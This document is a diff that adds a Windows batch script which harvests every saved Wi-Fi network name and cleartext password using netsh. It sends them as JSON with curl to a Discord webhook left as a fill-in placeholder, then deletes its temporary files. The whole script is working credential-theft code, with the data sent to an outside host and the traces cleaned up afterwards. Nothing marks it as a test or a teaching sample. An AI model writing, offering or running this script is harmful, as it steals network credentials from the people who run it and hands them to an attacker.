@@ -1,0 +1,30 @@
+@echo off
+echo Retrieving saved Wi-Fi passwords...
+echo. > %temp%\wifi_passwords.txt
+
+:: Extract saved Wi-Fi SSIDs and passwords
+for /f "tokens=2 delims=:" %%A in ('netsh wlan show profiles ^| findstr "All User Profile"') do (
+    set "ssid=%%A"
+    setlocal enabledelayedexpansion
+    echo SSID: !ssid! >> %temp%\wifi_passwords.txt
+    netsh wlan show profile name=!ssid! key=clear | findstr "Key Content" >> %temp%\wifi_passwords.txt
+    echo. >> %temp%\wifi_passwords.txt
+    endlocal
+)
+
+:: Prepare JSON payload for Discord Webhook
+(
+    echo { "content": "```
+    type %temp%\wifi_passwords.txt
+    echo ```" }
+) > %temp%\wifi_payload.json
+
+:: Send data to Discord Webhook (Replace with your actual webhook URL)
+curl -X POST -H "Content-Type: application/json" -d "@%temp%\wifi_payload.json" "YOUR_DISCORD_WEBHOOK_URL"
+
+:: Cleanup
+del %temp%\wifi_passwords.txt
+del %temp%\wifi_payload.json
+
+echo Wi-Fi passwords sent to webhook.
+pause
